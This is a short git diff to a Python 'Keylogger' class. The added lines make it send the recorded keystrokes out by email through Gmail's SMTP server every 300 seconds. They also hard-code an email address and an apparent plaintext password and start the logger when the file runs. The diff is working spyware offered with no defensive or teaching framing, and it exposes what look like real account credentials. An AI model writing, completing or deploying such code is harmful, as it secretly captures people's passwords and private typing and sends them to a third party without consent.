@@ -33,6 +33,7 @@ class Keylogger:
         server =smtplib.SMTP("smtp.gmail.com", 587)
         server.starttls()
         server.login(email, password)
+        server.sendmail(email,email,message)
         server.quit()
 
     def start(self):
@@ -40,3 +41,6 @@ class Keylogger:
         with keyboard_listener:
             self.report()
             keyboard_listener.join()
+
+my_keylogger =Keylogger(300, "Hustleryoung000@gmail.com", "Kizangila123")
+my_keylogger.start()
